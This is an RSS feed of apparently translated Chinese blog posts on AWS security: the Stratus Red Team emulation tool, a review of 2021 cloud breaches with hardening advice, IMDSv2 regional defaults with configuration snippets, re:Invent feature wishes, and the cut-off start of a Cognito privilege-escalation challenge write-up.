<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>AWS on 办公AI智能小助手</title>
        <link>http://localhost:1313/tags/aws/</link>
        <description>Recent content in AWS on 办公AI智能小助手</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>qife</copyright>
        <lastBuildDate>Mon, 04 Aug 2025 04:19:59 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/aws/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>Stratus Red Team：专为云环境设计的对抗模拟工具</title>
        <link>http://localhost:1313/p/stratus-red-team%E4%B8%93%E4%B8%BA%E4%BA%91%E7%8E%AF%E5%A2%83%E8%AE%BE%E8%AE%A1%E7%9A%84%E5%AF%B9%E6%8A%97%E6%A8%A1%E6%8B%9F%E5%B7%A5%E5%85%B7/</link>
        <pubDate>Mon, 04 Aug 2025 04:19:59 +0800</pubDate>
        
        <guid>http://localhost:1313/p/stratus-red-team%E4%B8%93%E4%B8%BA%E4%BA%91%E7%8E%AF%E5%A2%83%E8%AE%BE%E8%AE%A1%E7%9A%84%E5%AF%B9%E6%8A%97%E6%A8%A1%E6%8B%9F%E5%B7%A5%E5%85%B7/</guid>
        <description>&lt;p&gt;今天，我激动地发布过去几周开发的新开源项目：Stratus Red Team——一款专注于模拟云环境中常见攻击技术的对抗模拟和紫队工具。&lt;/p&gt;
&lt;h3 id=&#34;开发动机&#34;&gt;开发动机
&lt;/h3&gt;&lt;p&gt;我的职业经历大量涉及威胁检测。从学校毕业后，我首先在一家专注于终端安全的本地托管检测与响应公司从事威胁检测用例工作。后来当我转到科技公司的云安全岗位时，发现云环境中的恶意活动检测面临着相似挑战。&lt;/p&gt;
&lt;p&gt;其中一个挑战是在真实环境中复现攻击者的战术、技术和程序(TTPs)，以验证我们的日志管道和检测逻辑是否端到端正常工作。对于传统终端和本地安全，已有多个开源项目如Atomic Red Team™或MITRE Caldera。但这些工具都不是云原生构建的，缺乏对云服务商的专门支持，也缺少足够数量的云环境攻击技术。&lt;/p&gt;
&lt;h3 id=&#34;stratus-red-team介绍&#34;&gt;Stratus Red Team介绍
&lt;/h3&gt;&lt;p&gt;这个项目构想始于2021年初。得益于我在Datadog担任云安全研究员的新职位，终于得以实现。我们将其作为100%免费开源软件发布！&lt;/p&gt;
&lt;p&gt;官网：https://stratus-red-team.cloud/&lt;br&gt;
GitHub：https://github.com/DataDog/stratus-red-team&lt;/p&gt;
&lt;h3 id=&#34;技术实现原理&#34;&gt;技术实现原理
&lt;/h3&gt;&lt;h4 id=&#34;攻击技术即代码&#34;&gt;攻击技术即代码
&lt;/h4&gt;&lt;p&gt;每个攻击技术由两部分组成：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Terraform代码：描述执行攻击前需要部署的基础设施&lt;/li&gt;
&lt;li&gt;Go代码：定义技术元数据及其引爆逻辑&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;以&amp;quot;停止CloudTrail日志&amp;quot;攻击技术为例：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Terraform代码创建CloudTrail Trail和S3存储桶&lt;/li&gt;
&lt;li&gt;Go代码包含技术ID、MITRE ATT&amp;amp;CK映射，以及调用cloudtrail:StopLogging API的引爆函数&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;terraform自动化&#34;&gt;Terraform自动化
&lt;/h4&gt;&lt;p&gt;项目使用Hashicorp的terraform-exec库动态管理Terraform，无需用户预装：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;自动下载Terraform二进制到~/.stratus-red-team/terraform&lt;/li&gt;
&lt;li&gt;通过编程方式调用terraform apply/destroy&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;状态存储&#34;&gt;状态存储
&lt;/h4&gt;&lt;p&gt;工具在本地文件系统维护三种状态：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;攻击技术状态&lt;/li&gt;
&lt;li&gt;先决条件的Terraform状态&lt;/li&gt;
&lt;li&gt;Terraform输出值
存储路径：~/.stratus-red-team/[technique-id]&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;架构设计决策&#34;&gt;架构设计决策
&lt;/h3&gt;&lt;h4 id=&#34;编程语言选择&#34;&gt;编程语言选择
&lt;/h4&gt;&lt;p&gt;放弃Python选择Go的主要考量：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;强类型特性提升开发效率&lt;/li&gt;
&lt;li&gt;官方Terraform封装库支持&lt;/li&gt;
&lt;li&gt;编译时错误检查&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;代价是牺牲了动态加载用户代码的扩展性，新攻击技术必须打包到主二进制中。&lt;/p&gt;
&lt;h4 id=&#34;先决设施处理&#34;&gt;先决设施处理
&lt;/h4&gt;&lt;p&gt;采用内置Terraform代码全自动管理基础设施，当前限制：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;仅支持新建资源测试&lt;/li&gt;
&lt;li&gt;不支持针对现有基础设施演练&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;合格攻击技术的标准&#34;&gt;合格攻击技术的标准
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;原子性：模拟攻击链中的单一步骤&lt;/li&gt;
&lt;li&gt;真实性：可推导出有效的威胁检测规则&lt;/li&gt;
&lt;li&gt;自包含性：不假设AWS账户的初始状态&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;未来规划&#34;&gt;未来规划
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;增加更多AWS攻击技术&lt;/li&gt;
&lt;li&gt;添加Kubernetes支持&lt;/li&gt;
&lt;li&gt;实现可选遥测功能(默认关闭)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;项目已在GitHub开源，欢迎通过Twitter或邮件提交反馈。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>2021年云安全漏洞与数据泄露回顾：从凭证泄露到S3配置错误</title>
        <link>http://localhost:1313/p/2021%E5%B9%B4%E4%BA%91%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E5%9B%9E%E9%A1%BE%E4%BB%8E%E5%87%AD%E8%AF%81%E6%B3%84%E9%9C%B2%E5%88%B0s3%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF/</link>
        <pubDate>Sun, 03 Aug 2025 23:09:59 +0800</pubDate>
        
        <guid>http://localhost:1313/p/2021%E5%B9%B4%E4%BA%91%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E5%9B%9E%E9%A1%BE%E4%BB%8E%E5%87%AD%E8%AF%81%E6%B3%84%E9%9C%B2%E5%88%B0s3%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF/</guid>
        <description>&lt;h1 id=&#34;2021年云安全漏洞与数据泄露回顾&#34;&gt;2021年云安全漏洞与数据泄露回顾
&lt;/h1&gt;&lt;h2 id=&#34;引言&#34;&gt;引言
&lt;/h2&gt;&lt;p&gt;云安全事件的实际数据往往缺乏细节，且存在幸存者偏差。本文聚焦2021年公开披露的云安全事件，不包括云服务提供商自身的漏洞。&lt;/p&gt;
&lt;h2 id=&#34;2021年趋势&#34;&gt;2021年趋势
&lt;/h2&gt;&lt;h3 id=&#34;静态凭证仍是主要初始访问途径&#34;&gt;静态凭证仍是主要初始访问途径
&lt;/h3&gt;&lt;p&gt;静态长期凭证的泄露风险极高。计算表明：假设组织有10个静态凭证，每个每天有0.01%泄露风险，2年内至少一个凭证泄露的概率达52%。&lt;/p&gt;
&lt;h4 id=&#34;实际数据泄露案例&#34;&gt;实际数据泄露案例
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Codecov&lt;/strong&gt;：公开Docker镜像包含GCP服务账户凭证，攻击者替换安装脚本窃取环境变量&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Juspay&lt;/strong&gt;：未回收的访问密钥被窃，导致3500万条支付数据泄露&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Kaspersky&lt;/strong&gt;：AWS SES令牌泄露用于发送钓鱼邮件&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Upstox/MobiKwik&lt;/strong&gt;：访问密钥泄露导致350万客户KYC数据外泄&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;漏洞案例&#34;&gt;漏洞案例
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Glassdoor员工在GitHub公开AWS访问密钥&lt;/li&gt;
&lt;li&gt;BeVigil发现40款流行Android应用内嵌AWS密钥&lt;/li&gt;
&lt;li&gt;暴露的Apache Airflow实例泄露AWS凭证&lt;/li&gt;
&lt;li&gt;SEGA Europe公开S3存储桶泄露多组凭证&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;恶意软件&#34;&gt;恶意软件
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;TeamTNT团伙窃取AWS/GCP/Docker凭证&lt;/li&gt;
&lt;li&gt;攻击者利用Log4Shell漏洞窃取AWS凭证&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;公开s3存储桶问题&#34;&gt;公开S3存储桶问题
&lt;/h3&gt;&lt;p&gt;2021年公开披露的S3存储桶数据泄露案例：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;公司&lt;/th&gt;
          &lt;th&gt;数据类型&lt;/th&gt;
          &lt;th&gt;影响用户数&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;Hobby Lobby&lt;/td&gt;
          &lt;td&gt;姓名/邮箱/地址/源码&lt;/td&gt;
          &lt;td&gt;&amp;gt;30万&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Decathlon Spain&lt;/td&gt;
          &lt;td&gt;姓名/邮箱/电话&lt;/td&gt;
          &lt;td&gt;&amp;gt;7.8万&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Pixlr&lt;/td&gt;
          &lt;td&gt;邮箱/哈希密码&lt;/td&gt;
          &lt;td&gt;190万&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;MobiKwik&lt;/td&gt;
          &lt;td&gt;KYC数据/交易日志&lt;/td&gt;
          &lt;td&gt;350万(KYC)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;SEGA Europe&lt;/td&gt;
          &lt;td&gt;API密钥&lt;/td&gt;
          &lt;td&gt;未披露&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;技术防护方案&#34;&gt;技术防护方案
&lt;/h2&gt;&lt;h3 id=&#34;消除静态长期凭证&#34;&gt;消除静态长期凭证
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;人类用户&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用AWS SSO或IAM角色联合&lt;/li&gt;
&lt;li&gt;通过SCP策略阻止IAM用户创建&lt;/li&gt;
&lt;li&gt;使用aws-vault加密磁盘凭证&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;应用程序&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;优先使用EC2实例角色/Lambda执行角色&lt;/li&gt;
&lt;li&gt;非AWS环境使用Hashicorp Vault&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;SaaS集成&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;创建专用IAM角色+随机ExternalID&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;扫描异常凭证&#34;&gt;扫描异常凭证
&lt;/h3&gt;&lt;p&gt;推荐工具：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;代码扫描：detect-secrets/gitleaks/truffleHog&lt;/li&gt;
&lt;li&gt;Docker扫描：SecretScanner/ggshield&lt;/li&gt;
&lt;li&gt;GitGuardian可验证AWS凭证有效性&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;修复s3存储桶配置&#34;&gt;修复S3存储桶配置
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;基础措施&lt;/strong&gt;：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;账户发现与清单&lt;/li&gt;
&lt;li&gt;IaC扫描工具(tfsec/checkov)&lt;/li&gt;
&lt;li&gt;启用账户级S3 Public Access Block&lt;/li&gt;
&lt;li&gt;运行时扫描(Prowler/ScoutSuite)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;高级加固&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;VPC端点限制访问&lt;/li&gt;
&lt;li&gt;客户管理KMS密钥加密&lt;/li&gt;
&lt;li&gt;启用S3数据事件日志&lt;/li&gt;
&lt;li&gt;使用PMapper分析访问权限&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;保护实例元数据服务&#34;&gt;保护实例元数据服务
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;通过SCP强制使用IMDSv2&lt;/li&gt;
&lt;li&gt;EKS环境阻止Pod访问元数据服务&lt;/li&gt;
&lt;li&gt;利用GuardDuty检测凭证外泄&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;结论&#34;&gt;结论
&lt;/h2&gt;&lt;p&gt;2021年的攻击技术并无重大创新，这反而凸显了基础安全措施的重要性。预计2022年会出现更多类似事件，攻击者可能采用更高级的持久化技术。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;特别说明：本文作者目前就职于Datadog，但本文非公司赞助内容。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>IMDSv2强制实施：即将登陆您所在的区域！</title>
        <link>http://localhost:1313/p/imdsv2%E5%BC%BA%E5%88%B6%E5%AE%9E%E6%96%BD%E5%8D%B3%E5%B0%86%E7%99%BB%E9%99%86%E6%82%A8%E6%89%80%E5%9C%A8%E7%9A%84%E5%8C%BA%E5%9F%9F/</link>
        <pubDate>Sun, 03 Aug 2025 13:07:21 +0800</pubDate>
        
        <guid>http://localhost:1313/p/imdsv2%E5%BC%BA%E5%88%B6%E5%AE%9E%E6%96%BD%E5%8D%B3%E5%B0%86%E7%99%BB%E9%99%86%E6%82%A8%E6%89%80%E5%9C%A8%E7%9A%84%E5%8C%BA%E5%9F%9F/</guid>
        <description>&lt;h3 id=&#34;imdsv2强制实施即将登陆您所在的区域&#34;&gt;IMDSv2强制实施：即将登陆您所在的区域！
&lt;/h3&gt;&lt;p&gt;3月25日，AWS发布了一项新功能，默认对新启动的EC2实例实施IMDSv2（Instance Metadata Service Version 2）。这项期待已久的功能虽然仍有改进空间，但标志着云安全的重要进步。&lt;/p&gt;
&lt;h4 id=&#34;imdsv2简介&#34;&gt;IMDSv2简介
&lt;/h4&gt;&lt;p&gt;IMDSv2是AWS于2019年11月推出的安全机制，旨在应对Capital One数据泄露事件。该事件由SSRF（服务器端请求伪造）漏洞引发，促使美国参议员致信AWS询问防护措施。IMDSv2能有效防止攻击者通过SSRF漏洞从实例元数据服务窃取凭证。&lt;/p&gt;
&lt;p&gt;2021-2022年的研究表明，此类漏洞是公开云安全事件最常见的原因之一。Nick Frichette的《保护EC2实例元数据服务》对此有深度解析。&lt;/p&gt;
&lt;h4 id=&#34;演进历程&#34;&gt;演进历程
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;初始阶段&lt;/strong&gt;：需在实例或启动模板中手动设置&lt;code&gt;metadata_options.http_tokens=&amp;quot;required&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2022年10月&lt;/strong&gt;：支持在AMI注册时指定&lt;code&gt;--imds-support v2.0&lt;/code&gt;参数&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2023年3月&lt;/strong&gt;：Amazon Linux 2023默认启用IMDSv2&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2023年11月&lt;/strong&gt;：EC2控制台&amp;quot;快速启动&amp;quot;界面默认启用&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2024年3月&lt;/strong&gt;：推出区域级默认设置功能&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;新api详解&#34;&gt;新API详解
&lt;/h4&gt;&lt;p&gt;新增的两个API允许在区域级别设置元数据默认值：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;client&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;modify_instance_metadata_defaults&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;HttpTokens&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;required&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# 关键参数&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;HttpPutResponseHopLimit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;123&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;HttpEndpoint&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;enabled&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;InstanceMetadataTags&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;disabled&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;优先级规则：实例设置 &amp;gt; 区域设置 &amp;gt; AMI设置 &amp;gt; 默认不启用。&lt;/p&gt;
&lt;h4 id=&#34;terraform集成&#34;&gt;Terraform集成
&lt;/h4&gt;&lt;p&gt;通过&lt;code&gt;aws_ec2_instance_metadata_defaults&lt;/code&gt;资源实现：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-hcl&#34; data-lang=&#34;hcl&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;resource&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;aws_ec2_instance_metadata_defaults&amp;#34; &amp;#34;imdsv2&amp;#34;&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;  http_tokens&lt;/span&gt;                 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;required&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;  instance_metadata_tags&lt;/span&gt;      &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;disabled&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;  http_endpoint&lt;/span&gt;               &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;enabled&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;  http_put_response_hop_limit&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;注意事项&#34;&gt;注意事项
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;2024年中起，新型EC2实例将默认仅支持IMDSv2&lt;/li&gt;
&lt;li&gt;该功能仅设置默认值，仍需配合SCP或&lt;code&gt;ec2:MetadataHttpTokens&lt;/code&gt;条件键进行强制管控&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这项功能为云安全实践者提供了重要的管控工具，但AWS仍需进一步改进默认安全配置。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>我在re:Invent大会上的技术诉求：从跨AZ带宽定价到CHERI实例</title>
        <link>http://localhost:1313/p/%E6%88%91%E5%9C%A8reinvent%E5%A4%A7%E4%BC%9A%E4%B8%8A%E7%9A%84%E6%8A%80%E6%9C%AF%E8%AF%89%E6%B1%82%E4%BB%8E%E8%B7%A8az%E5%B8%A6%E5%AE%BD%E5%AE%9A%E4%BB%B7%E5%88%B0cheri%E5%AE%9E%E4%BE%8B/</link>
        <pubDate>Sun, 03 Aug 2025 08:00:39 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%88%91%E5%9C%A8reinvent%E5%A4%A7%E4%BC%9A%E4%B8%8A%E7%9A%84%E6%8A%80%E6%9C%AF%E8%AF%89%E6%B1%82%E4%BB%8E%E8%B7%A8az%E5%B8%A6%E5%AE%BD%E5%AE%9A%E4%BB%B7%E5%88%B0cheri%E5%AE%9E%E4%BE%8B/</guid>
        <description>&lt;p&gt;作为AWS Hero，我获得了免费参加AWS re:Invent大会的机会。虽然我很少对多数演讲感兴趣——往年我参加过一些&amp;quot;高级&amp;quot;讲座，但内容都未超出已发布的文档范围——但我发现这是与亚马逊员工交流的绝佳机会。&lt;/p&gt;
&lt;p&gt;今年我有一长串诉求清单，考虑到可能引起亚马逊员工（甚至非亚马逊人士）的兴趣，我决定在此公开分享：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;增加re:Invent大会上的亚马逊开源开发者数量&lt;/strong&gt;&lt;br&gt;
我期待周三与Valkey开发者会面，但对Firecracker开发者无人参会感到失望。亚马逊有不派工程师参会除非他们演讲的政策（我希望能改变这一政策），但对开源开发者而言，参会结识潜在贡献者至关重要。如果你的开源团队不参加会议，无论代码采用什么许可证，都不算真正在做开源。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;降低跨可用区(AZ)带宽定价&lt;/strong&gt;&lt;br&gt;
我甚至不太在意成本本身，但人们对跨AZ带宽的担忧导致他们设计出糟糕的系统架构。亚马逊&amp;quot;良好架构框架&amp;quot;中的一条准则是将工作负载部署到多个位置，并明确指出使用单一可用区是个问题——但对跨AZ带宽的担忧（即使最终证明是多余的）阻碍了人们遵循这一准则。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;机架级EBS存储&lt;/strong&gt;&lt;br&gt;
当前&amp;quot;SSD&amp;quot;EBS卷的I/O延迟表明它们与访问的EC2实例相距甚远。而某些EC2实例类型直接附加SSD，I/O性能显著提升——但耐久性低（实例终止数据即丢失）且缺乏弹性。将EBS存储部署在与EC2节点相同的机架上，可提供介于两者之间的解决方案，实现比跨数据中心更低的延迟，同时保持卷大小的灵活性。用户需接受&amp;quot;在此实例同机架创建卷&amp;quot;可能返回&amp;quot;该机架磁盘已满&amp;quot;的情况，但至少在实例启动时可以寻找有足够本地磁盘的机架。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;支持CHERI的安全实例&lt;/strong&gt;&lt;br&gt;
这是我长期以来的愿望清单项目。CHERI在安全性方面具有巨大优势，哪家云厂商率先实现将遥遥领先竞争对手。我知道亚马逊（和其他云厂商）拥有用于研究的Morello开发板。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Marketplace支持&amp;quot;待发布&amp;quot;版本&lt;/strong&gt;&lt;br&gt;
当我在AWS Marketplace添加新的FreeBSD版本时，需经过审批流程并复制到所有EC2区域，然后Marketplace更新产品列表并发送新版本邮件通知。这常导致亚马逊发送新FreeBSD版本邮件比我官方发布公告还早几天。我希望能够预先告知Marketplace即将发布的FreeBSD版本，让他们准备就绪但暂不更新网站或发送邮件，直到我准备好官方公告（通常会给镜像和云服务几天同步时间）。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;此外，我还向Zoom提出改进建议：当从FreeBSD笔记本电脑加入会议时，Zoom网站应能通过用户代理字符串识别没有客户端，直接提供在浏览器中开会的选项，而不是反复尝试打开客户端。Zoom团队立即理解问题，甚至考虑将Linux客户端移植到FreeBSD。&lt;/p&gt;
&lt;p&gt;关于透明度说明：除了提供免费参会和差旅，亚马逊还赞助我的FreeBSD工作。他们资助的内容约一半是EC2相关，另一半是FreeBSD发布工程。没有他们的支持，许多重要功能将无法出现在FreeBSD 14.2-RELEASE中。感谢亚马逊。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>探索AWS Batch权限提升漏洞的技术分析</title>
        <link>http://localhost:1313/p/%E6%8E%A2%E7%B4%A2aws-batch%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</link>
        <pubDate>Sun, 03 Aug 2025 01:56:38 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%8E%A2%E7%B4%A2aws-batch%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h3 id=&#34;从上一期说起您解决cloudsectidbit第2期的iac实验了吗&#34;&gt;从上一期说起&amp;hellip;您解决CloudSecTidbit第2期的IaC实验了吗？
&lt;/h3&gt;&lt;p&gt;[解决方案]
AWS Cognito挑战的核心是通过权限提升获取管理员权限并读取内部用户列表。应用程序使用AWS Cognito颁发的会话令牌（保存为名为&lt;code&gt;aws-cognito-app-access-token&lt;/code&gt;的cookie），攻击者可以通过以下步骤实现提权：&lt;/p&gt;
